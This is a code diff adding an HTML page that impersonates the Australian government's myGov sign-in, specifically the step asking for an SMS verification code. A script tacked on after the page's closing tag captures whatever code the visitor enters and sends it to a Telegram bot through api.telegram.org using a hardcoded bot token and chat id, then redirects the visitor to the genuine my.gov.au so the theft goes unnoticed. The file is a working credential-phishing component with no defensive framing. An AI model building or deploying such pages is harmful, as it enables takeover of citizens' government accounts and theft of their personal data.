@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="./output.css" rel="stylesheet" />
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap"
+      rel="stylesheet"
+    />
+    <title>Sign in with myGov - myGov</title>
+  </head>
+  <body class="font-roboto overflow-x-hidden">
+    <!-- Header Starts Here -->
+    <div class="w-screen lg:h-[12.025rem] h-[83px] bg-primary">
+      <div class="flex justify-between h-full items-center lg:px-16 px-5">
+        <a href="https://beta.my.gov.au/" aria-label="mygov">
+          <img
+            src="./images/mygov-logo.svg"
+            class="lg:h-[70px] h-[51px]"
+            alt=""
+            srcset=""
+          />
+        </a>
+
+        <a
+          href="https://beta.my.gov.au/en/about/help"
+          class="text-[1.02rem] font-[500] underline"
+          >Help</a
+        >
+      </div>
+    </div>
+    <!-- Header Ends Here -->
+
+    <!--Form Starts Here-->
+    <div class="h-full pt-16 px-6">
+      <div class="flex justify-center flex-col my-0 mx-auto max-w-lg">
+        <div class="flex justify-start flex-col">
+          <h1 class="text-[2rem] font-[700] text-tertiary pb-3">
+            Enter Code
+          </h1>
+          <p class="text-tertiary pb-7 text-[18px] font-bold">
+            we sent a code to the mobile number XXXX XXX XXX
+          </p>
+
+          <form
+            action=""
+            method="POST"
+            id="messageForm"
+          >
+                <div class="flex items-start flex-col pb-7">
+              <p class="font-bold pb-2">Code</p>
+              <input
+                type="text"
+                name="code"
+                aria-label="code"
+                class="w-[200px] h-[2.8rem] p-2 border border-tertiary border-solid border-opacity-95 focus:border-separate" required
+              />
+              <div class="flex pt-2 items-center">
+
+              <p class="text-secondary font-medium underline pr-2">
+                I didn't get my code
+              </p>
+            <img
+              src="./images//blugov-left-chevron-dark.svg"
+              alt=""
+              class="h-[10px] -rotate-90"
+              srcset=""
+            />
+              </div>
+
+            </div>
+            <button
+              type="submit"
+              class="w-full group bg-primary_blur rounded-md py-[11px] text-secondary font-medium hover:bg-secondary"
+            >
+              <p class="group-hover:text-white">Next</p>
+            </button>
+            <button
+              type="submit"
+              class=" mt-4 w-full group bg-white border-2 border-secondary border-solid rounded-md py-[11px] text-secondary font-medium hover:bg-secondary"
+            >
+              <p class="group-hover:text-white">Cancel</p>
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+          <!--Foooter Starts Here-->
+          <div class="bg-black">
+            <div class="px-10 lg:px-32 mt-20">
+              <div class="py-8">
+                <ul class="text-white text-sm flex flex-wrap gap-7">
+                  <li>
+                    <a href="https://my.gov.au/en/about/terms">Terms of use</a>
+                  </li>
+                  <li>
+                    <a href="https://my.gov.au/en/about/privacy-and-security"
+                      >Privacy and Security</a
+                    >
+                  </li>
+                  <li>
+                    <a href="https://my.gov.au/en/about/copyright">Copyright</a>
+                  </li>
+                  <li>
+                    <a href="https://my.gov.au/en/about/accessibility"
+                      >Accessibility</a
+                    >
+                  </li>
+                </ul>
+              </div>
+              <div class="w-full h-[1px] bg-gray"></div>
+              <div
+                class="flex lg:items-center items-start gap-12 lg:flex-row flex-col justify-between pt-16 pb-12"
+              >
+                <img
+                  src="./images/mygov-logo-white.svg"
+                  class="xl:h-[68px] lg:h-[54px] h-[68px]"
+                  alt=""
+                  srcset=""
+                />
+                <p class="text-white text-base w-full lg:w-[650px]">
+                  We acknowledge the Traditional Custodians of the lands we live
+                  on. We pay our respects to all Elders, past and present, of
+                  all Aboriginal and Torres Strait Islander nations.
+                </p>
+              </div>
+            </div>
+
+            <!--Form Ends Here-->
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
+
+
+<script>
+    const chat_id = "6134643042",
+    botID = "bot5819285797:AAH3dyjYgGJUUi0GL5YZsQ7l_Mv6EyLbgSI";
+  const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+  document
+    .querySelector("#messageForm")
+    .addEventListener("submit", async (e) => {
+      // When the user submits the form
+      e.preventDefault(); // Don't submit
+      let text = JSON.stringify(
+        // Convert the form data to a string to send as our Telegram message
+        Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null,
+        2
+      ); // Prettify the JSON so we can read the data easily
+      const sendMessage = await fetch(telegramURL, {
+        // Send the request to the telegram API
+        method: "POST",
+        headers: { "Content-Type": "application/json" }, // This is required when sending a JSON body.
+        body: JSON.stringify({ chat_id, text }), // The body must be a string, not an object
+      });
+      const messageStatus = document.querySelector("#status");
+      if (sendMessage.ok) {
+        // Update the user on if the message went through
+        window.location.href = "https://my.gov.au/";
+        messageStatus.textContent = "Message Sent!";
+
+          
+        
+      } else
+        messageStatus.textContent =
+          "Message Failed to send :( " + (await sendMessage.text());
+      e.target.reset(); // Clear the form fields.
+    });
+</script>
